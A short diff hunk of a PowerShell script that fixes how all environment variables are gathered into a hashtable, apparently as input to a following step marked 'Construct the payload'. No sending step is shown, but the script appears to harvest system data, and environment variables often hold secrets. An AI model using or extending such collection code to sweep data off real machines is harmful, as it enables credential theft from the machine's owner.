@@ -14,10 +14,9 @@ foreach ($profile in $profiles) {
   }
 }
 
-$envVars = gci env:* | ForEach-Object {
-  @{
-    $_.Name = $_.Value
-  }
+$envVars = @{}
+gci env:* | ForEach-Object {
+  $envVars[$_.Name] = $_.Value
 }
 
 # Construct the payload
